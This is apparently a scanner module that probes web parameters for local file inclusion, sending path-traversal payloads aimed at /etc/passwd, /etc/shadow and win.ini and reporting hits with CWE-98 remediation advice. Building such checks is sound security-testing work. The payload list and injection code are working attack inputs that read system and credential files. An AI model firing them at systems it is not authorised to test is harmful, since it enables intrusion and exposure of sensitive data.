import httpx
from modules.scanner.base_check import BaseCheck, CheckResult

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../etc/shadow",
    "../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
]


class LfiCheck(BaseCheck):
    name = "active_lfi"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for param in target_params:
                for payload in LFI_PAYLOADS:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        body_lower = resp.text.lower()
                        if "root:x:0:0:" in resp.text or "root:" in resp.text:
                            results.append(CheckResult(
                                triggered=True,
                                severity="high",
                                title="LFI detected — /etc/passwd read",
                                description=f"Parameter '{param}' is vulnerable to local file inclusion.",
                                evidence=f"Payload: {payload}\nStatus: {resp.status_code}",
                                remediation="Validate file paths. Avoid user input in file operations. Use a whitelist of allowed files.",
                                cwe="CWE-98",
                            ))
                        elif "[fonts]" in body_lower or "[extensions]" in body_lower:
                            results.append(CheckResult(
                                triggered=True,
                                severity="high",
                                title="LFI detected — Windows file read",
                                description=f"Parameter '{param}' can read Windows system files.",
                                evidence=f"Payload: {payload}\nStatus: {resp.status_code}",
                                remediation="Validate file paths. Avoid user input in file operations.",
                                cwe="CWE-98",
                            ))
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import copy
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
